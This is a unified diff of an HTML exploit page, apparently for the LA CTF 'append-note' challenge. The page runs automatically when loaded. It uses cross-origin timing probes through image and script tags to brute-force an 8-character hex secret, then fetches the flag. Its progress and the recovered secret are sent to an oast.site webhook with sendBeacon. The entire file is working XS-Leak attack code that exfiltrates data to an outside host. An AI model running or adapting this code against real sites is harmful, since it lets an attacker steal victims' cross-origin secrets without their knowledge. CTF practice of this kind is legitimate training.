@@ -1,183 +1,213 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>STARK ENT. - APPEND_NOTE_SOLVER v3</title>
+    <title>APPEND NOTE SOLVER - Status Oracle</title>
     <style>
         body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
-        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
+        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 12px; }
         .success { color: #3fb950; font-weight: bold; }
         .error { color: #f85149; }
+        .info { color: #58a6ff; }
     </style>
 </head>
 <body>
-    <h2 id="status">INITIATING BRUTE FORCE...</h2>
+    <h2 id="status">INITIALIZING...</h2>
     <div id="log"></div>
 <script>
     const TARGET = "https://append-note-61jaz.instancer.lac.tf";
-    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu88dorcsdwsq0ju.oast.site";
+    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu8c71o2s8i31shs.oast.site";
     const CHARS = "0123456789abcdef";
     
-    const log = (msg, cls="") => {
+    const log = (msg, cls="info") => {
         const div = document.createElement("div");
         div.className = "log-entry " + cls;
         div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
         document.getElementById("log").prepend(div);
+        console.log(msg);
     };
     
     const report = (data) => {
-        navigator.sendBeacon(`${WEBHOOK}?${encodeURIComponent(JSON.stringify(data))}`);
+        const payload = JSON.stringify(data);
+        log(`📡 Reporting: ${payload.substring(0, 100)}...`);
+        navigator.sendBeacon(`${WEBHOOK}/${encodeURIComponent(payload)}`);
     };
     
-    // Use fetch with timing - more reliable than iframes
-    async function probe(content) {
+    // Detect HTTP status via script loading (200 vs 404)
+    async function testStatus(content) {
         const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
         
         return new Promise((resolve) => {
-            const t0 = performance.now();
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            
+            const script = document.createElement('script');
             let resolved = false;
             
-            // Use a short timeout to detect fast 200 responses
-            const timer = setTimeout(() => {
+            const cleanup = (result) => {
                 if (!resolved) {
                     resolved = true;
-                    const elapsed = performance.now() - t0;
-                    if (iframe.parentNode) {
-                        document.body.removeChild(iframe);
+                    if (script.parentNode) {
+                        document.body.removeChild(script);
                     }
-                    resolve(elapsed);
-                }
-            }, 500);
-            
-            iframe.onload = iframe.onerror = () => {
-                if (!resolved) {
-                    resolved = true;
-                    clearTimeout(timer);
-                    const elapsed = performance.now() - t0;
-                    if (iframe.parentNode) {
-                        document.body.removeChild(iframe);
-                    }
-                    resolve(elapsed);
+                    resolve(result);
                 }
             };
             
-            document.body.appendChild(iframe);
-            iframe.src = url;
+            // 200 response - will try to execute as JS and likely error
+            script.onerror = () => cleanup('200_or_error');
+            
+            // If it somehow loads successfully
+            script.onload = () => cleanup('200_loaded');
+            
+            // Timeout fallback
+            setTimeout(() => cleanup('timeout'), 1500);
+            
+            document.body.appendChild(script);
+            script.src = url;
         });
     }
     
-    // Alternative: Use window.open with better detection
-    async function probeWindow(content) {
+    // Better oracle: use fetch and measure timing with Resource Timing API
+    async function probeTiming(content, rounds = 5) {
         const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
-        const t0 = performance.now();
+        let times = [];
         
-        // Open in a new window with unique name
-        const w = window.open(url, '_blank_' + Math.random());
+        for (let i = 0; i < rounds; i++) {
+            const t0 = performance.now();
+            
+            try {
+                // Use img tag for cross-origin timing
+                await new Promise((resolve, reject) => {
+                    const img = new Image();
+                    const timeout = setTimeout(() => {
+                        img.src = '';
+                        resolve();
+                    }, 800);
+                    
+                    img.onload = img.onerror = () => {
+                        clearTimeout(timeout);
+                        resolve();
+                    };
+                    
+                    img.src = url + `&_=${Date.now()}_${i}`; // Cache bust
+                });
+            } catch(e) {}
+            
+            const elapsed = performance.now() - t0;
+            times.push(elapsed);
+            
+            // Small delay between attempts
+            await new Promise(r => setTimeout(r, 100));
+        }
         
-        return new Promise((resolve) => {
-            // Wait and measure
-            setTimeout(() => {
-                const elapsed = performance.now() - t0;
-                try {
-                    if (w && !w.closed) {
-                        w.close();
-                    }
-                } catch(e) {}
-                resolve(elapsed);
-            }, 400);
-        });
+        // Remove outliers and average
+        times.sort((a, b) => a - b);
+        const trimmed = times.slice(1, -1); // Remove min and max
+        const avg = trimmed.reduce((a, b) => a + b, 0) / trimmed.length;
+        const variance = Math.sqrt(trimmed.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / trimmed.length);
+        
+        return { avg, variance, times, trimmed };
     }
     
     async function solve() {
+        log("🚀 Starting attack...", "success");
+        report({ status: "started", target: TARGET });
+        
+        // Calibrate baseline with multiple invalid prefixes
+        log("📊 Calibrating baseline (this takes ~30 seconds)...");
+        const baselines = [];
+        for (let i = 0; i < 3; i++) {
+            const result = await probeTiming("INVALID_" + Math.random().toString(36), 5);
+            baselines.push(result.avg);
+            log(`  Baseline ${i+1}: ${result.avg.toFixed(1)}ms ±${result.variance.toFixed(1)}ms`);
+        }
+        const baseline = baselines.reduce((a, b) => a + b) / baselines.length;
+        log(`✓ Baseline established: ${baseline.toFixed(1)}ms`, "success");
+        
         let secret = "";
         
-        log("Starting attack with window-based timing...");
-        report({status: "started", target: TARGET});
-        
-        // Simple baseline
-        log("Measuring baseline...");
-        const b1 = await probeWindow("XXXXX" + Math.random());
-        await new Promise(r => setTimeout(r, 200));
-        const b2 = await probeWindow("YYYYY" + Math.random());
-        await new Promise(r => setTimeout(r, 200));
-        const b3 = await probeWindow("ZZZZZ" + Math.random());
-        const baseline = (b1 + b2 + b3) / 3;
-        
-        log(`Baseline: ${baseline.toFixed(1)}ms (samples: ${b1.toFixed(0)}, ${b2.toFixed(0)}, ${b3.toFixed(0)})`);
-        
         for (let pos = 0; pos < 8; pos++) {
-            log(`\n>>> Position ${pos + 1}/8 <<<`);
+            log(`\n${"=".repeat(50)}`);
+            log(`🔍 CRACKING POSITION ${pos + 1}/8`, "success");
+            log(`${"=".repeat(50)}`);
             
-            let bestChar = '';
-            let bestDelta = -999;
-            let allResults = [];
+            let results = [];
             
             for (const c of CHARS) {
                 const attempt = secret + c;
+                const result = await probeTiming(attempt, 5);
+                const delta = baseline - result.avg;
+                const confidence = delta / result.variance; // Signal-to-noise ratio
                 
-                // Take 2 measurements
-                const t1 = await probeWindow(attempt);
-                await new Promise(r => setTimeout(r, 150));
-                const t2 = await probeWindow(attempt);
-                await new Promise(r => setTimeout(r, 150));
+                results.push({ 
+                    char: c, 
+                    avg: result.avg, 
+                    variance: result.variance,
+                    delta, 
+                    confidence,
+                    times: result.times 
+                });
                 
-                const avg = (t1 + t2) / 2;
-                const delta = baseline - avg; // Positive = faster than baseline
-                
-                allResults.push({c, avg, delta, times: [t1, t2]});
-                
-                log(`  ${c}: ${avg.toFixed(1)}ms (Δ${delta >= 0 ? '+' : ''}${delta.toFixed(1)}) [${t1.toFixed(0)},${t2.toFixed(0)}]`);
-                
-                if (delta > bestDelta) {
-                    bestDelta = delta;
-                    bestChar = c;
-                }
+                const indicator = delta > 5 ? "🔥" : delta > 2 ? "⚡" : "  ";
+                log(`  ${indicator} '${c}': ${result.avg.toFixed(1)}ms (Δ ${delta > 0 ? '+' : ''}${delta.toFixed(1)}ms, σ ${result.variance.toFixed(1)}, conf ${confidence.toFixed(2)})`);
             }
             
-            secret += bestChar;
-            log(`✓ Position ${pos+1}: '${bestChar}' (Δ+${bestDelta.toFixed(1)}ms)`, "success");
-            log(`  Current secret: ${secret}`, "success");
+            // Sort by confidence (signal-to-noise)
+            results.sort((a, b) => b.confidence - a.confidence);
+            
+            const winner = results[0];
+            const runnerUp = results[1];
+            
+            secret += winner.char;
+            
+            log(`\n✅ SELECTED: '${winner.char}' (Δ+${winner.delta.toFixed(1)}ms, confidence ${winner.confidence.toFixed(2)})`, "success");
+            log(`   Runner-up: '${runnerUp.char}' (Δ+${runnerUp.delta.toFixed(1)}ms, confidence ${runnerUp.confidence.toFixed(2)})`);
+            log(`   Current secret: ${secret}`, "success");
             
             report({
-                pos: pos,
-                char: bestChar,
+                position: pos,
+                char: winner.char,
                 secret: secret,
-                delta: bestDelta,
-                all: allResults.map(r => `${r.c}:${r.delta.toFixed(0)}`)
+                delta: winner.delta.toFixed(2),
+                confidence: winner.confidence.toFixed(2),
+                top5: results.slice(0, 5).map(r => ({
+                    c: r.char, 
+                    d: r.delta.toFixed(1),
+                    conf: r.confidence.toFixed(2)
+                }))
             });
         }
         
-        log(`\n=== FINAL SECRET: ${secret} ===`, "success");
+        log(`\n${"=".repeat(50)}`);
+        log(`🎯 FINAL SECRET: ${secret}`, "success");
+        log(`${"=".repeat(50)}`);
         
-        // Try to get flag
-        setTimeout(async () => {
-            try {
-                log("Fetching flag...");
-                const res = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
-                const flag = await res.text();
-                
-                log(`Response: ${flag}`);
-                
-                if (flag.includes('lactf{')) {
-                    log(`🚩 ${flag}`, "success");
-                    document.getElementById("status").textContent = flag;
-                    report({secret: secret, flag: flag, success: true});
-                } else {
-                    log(`Wrong secret. Trying variations...`, "error");
-                    document.getElementById("status").textContent = `Failed: ${flag}`;
-                    report({secret: secret, response: flag, success: false});
-                }
-            } catch(e) {
-                log(`Error: ${e}`, "error");
-                report({secret: secret, error: e.toString()});
+        // Attempt to retrieve flag
+        await new Promise(r => setTimeout(r, 1000));
+        
+        try {
+            log("🏴 Attempting flag retrieval...");
+            const flagUrl = `${TARGET}/flag?secret=${encodeURIComponent(secret)}`;
+            const res = await fetch(flagUrl);
+            const flag = await res.text();
+            const status = res.status;
+            
+            log(`Response [${status}]: ${flag}`);
+            
+            if (flag.startsWith('lactf{')) {
+                log(`\n🎉🎉🎉 FLAG CAPTURED: ${flag} 🎉🎉🎉`, "success");
+                document.getElementById("status").textContent = `✅ ${flag}`;
+                report({ secret, flag, status, success: true });
+            } else {
+                log(`❌ Wrong secret - got: "${flag}"`, "error");
+                document.getElementById("status").textContent = `❌ Failed: ${flag}`;
+                report({ secret, response: flag, status, success: false });
             }
-        }, 1000);
+        } catch(e) {
+            log(`❌ Error fetching flag: ${e}`, "error");
+            report({ secret, error: e.toString() });
+        }
     }
     
-    // Auto-start after a brief delay to ensure page is loaded
-    setTimeout(solve, 500);
+    // Start after brief delay
+    setTimeout(solve, 1000);
 </script>
 </body>
 </html>
